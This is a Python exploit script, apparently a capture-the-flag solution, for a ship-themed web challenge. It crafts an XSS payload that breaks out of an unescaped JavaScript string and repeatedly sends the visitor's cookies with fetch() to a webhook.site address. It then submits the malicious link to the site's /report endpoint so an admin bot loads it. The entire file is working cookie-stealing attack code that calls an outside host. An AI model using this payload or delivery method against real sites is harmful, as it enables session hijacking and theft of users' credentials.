#!/usr/bin/env python3
"""XSS cookie steal for Hisser Les Drapeaux — bot sets FLAG on hostname 'web'."""
import sys
import urllib.parse
import urllib.request

WEBHOOK = "https://webhook.site/e10aa026-c4f1-45e4-a462-f52087115683"

# Break out of JS string in ship.html: var currentShipName = "{{ ship.name | safe }}";
XSS = (
    '";</script><script>'
    "setInterval(function(){"
    "if(document.cookie.indexOf('FLAG')>=0){"
    f"fetch('{WEBHOOK}?c='+encodeURIComponent(document.cookie))"
    "}},300)"
    "</script><script>var z=\""
)


def exploit(host, port=5000, webhook=WEBHOOK):
    global XSS
    if webhook != WEBHOOK:
        XSS = XSS.replace(WEBHOOK, webhook)
    payload = urllib.parse.quote(XSS, safe="")
    bot_url = f"http://web:5000/ship?id={payload}"
    report_url = f"http://{host}:{port}/report"
    body = urllib.parse.urlencode({"url": bot_url}).encode()
    req = urllib.request.Request(
        report_url,
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.read().decode()


if __name__ == "__main__":
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    print(exploit(host, port))
